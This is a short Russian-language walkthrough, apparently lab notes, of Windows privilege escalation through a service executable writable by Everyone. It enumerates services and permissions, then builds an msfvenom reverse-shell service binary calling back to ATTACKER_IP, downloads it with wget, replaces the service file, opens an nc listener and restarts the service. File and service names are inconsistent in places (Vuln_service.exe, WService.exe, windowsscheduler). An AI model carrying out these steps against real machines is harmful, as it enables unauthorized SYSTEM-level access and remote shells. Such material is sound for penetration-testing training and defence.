### Уязвимость заключается в том, что любой может модифицировать исполняемый файл сервиса, который находится в поле BINARY_PATH_NAME

# Просмотр списка сервисов
- сmd.exe:
sc query

- powershell:
sc.exe query

или 

- сmd.exe:
services.msc

# Получаем сведения о сервисе

sc qc Vuln_service

* Вывод:
/* [SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Vuln_service
        TYPE: 10  WIN32_OWN_PROCESS
        START_TYPE: 2   AUTO_START
        ERROR_CONTROL: 0   IGNORE
        BINARY_PATH_NAME: C:\PROGRA~2\SYSTEM~1\Vuln_service.exe  <<<<<< Исполняемый файл
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Test vulnerable Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\Dummy
        
*/

# Проверяем права доступа к исполняемому файлу сервиса

icacls C:\PROGRA~2\SYSTEM~1\WService.exe

* Вывод:
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)   <<< Любой может модифицировать файл
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)


# И видим, что EVERYONE имеет права на модификацию файла

# Генерируем payload и скачиваем файл на целевой машине
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

python3 -m http.server 8000
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

# Заменяем файл сервиса на целевой машине

C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

# Запускаем слушатель и рестартуем сервис
nc -lvp 4445

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler